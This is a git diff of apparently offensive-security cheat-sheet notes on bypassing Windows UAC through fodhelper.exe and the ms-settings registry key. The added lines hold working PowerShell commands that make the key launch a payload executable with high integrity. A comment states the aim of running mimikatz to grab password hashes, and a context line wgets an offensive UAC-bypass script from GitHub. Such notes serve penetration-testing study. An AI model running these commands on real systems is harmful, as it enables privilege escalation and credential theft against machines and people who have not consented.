@@ -353,7 +353,7 @@ Windows Registry. More specifically, it interacts with registry keys that can be
 administrative privileges. We will attempt to find and modify these registry keys in order to run a
 command of our choosing with high integrity
 ````
-whoami /groups #check your integrity level
+whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
 ````
 ````
 C:\Windows\System32\fodhelper.exe #32 bit
@@ -366,6 +366,12 @@ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 ````
 ````
 wget https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1 
+````
+Launch Powershell and run the following
+````
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\Desktop[payloadname].exe" -Force
 ````
 
 
